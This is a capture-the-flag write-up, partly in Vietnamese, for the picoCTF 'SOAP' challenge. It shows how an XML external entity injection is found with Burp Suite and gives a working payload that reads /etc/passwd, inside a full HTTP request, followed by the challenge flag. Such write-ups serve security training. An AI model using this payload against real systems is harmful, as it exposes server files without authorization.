# Write-up : SOAP 
---
### Description :
> The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
### Hint :
> XML external entity Injection
--- 
### Solution :
- Sau khi đọc hint và đề bài thì chúng ta biết lỗi trong bài này là XML Injection
- Dùng burp suite kiểm tra request gửi đi thì ta thấy mỗi khi bấm details của mỗi hình thì sẽ trả về 1 tham số id khác nhau

Dùng burp suite để chặn 1 request và chuyển request đó sang repeater để cùng thử các payload:
> khi thay đổi tham số id thì có sự thay đổi của response gửi về, khi thay đổi về 0 thì trả về :
```http
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Fri, 27 Jun 2025 14:48:32 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 13
Connection: close

Invalid ID: 0
```
Thử với `` &lt; `` thì trả về : `` < `` 
```http
POST /data HTTP/1.1
Host: saturn.picoctf.net:61837
Content-Length: 128
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:61837
Referer: http://saturn.picoctf.net:61837/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<data><ID>&lt;</ID></data>
```
> Từ đó cho ta thấy `` xml parser `` có chạy vì thế ta có thể tạo và sửa đổi nội dung xml

Payload tấn công :
```xml
<!DOCTYPE data [<!ENTITY abc SYSTEM "file:///etc/passwd">]>
```
Và gọi `` &abc `` ở chỗ `` xml parser `` hoạt động 
```http
POST /data HTTP/1.1
Host: saturn.picoctf.net:61837
Content-Length: 128
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:61837
Referer: http://saturn.picoctf.net:61837/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY abc SYSTEM "file:///etc/passwd">]>
<data><ID>&abc;</ID></data>
```
### Flag : `` picoCTF{XML_3xtern@l_3nt1t1ty_55662c16} `` 
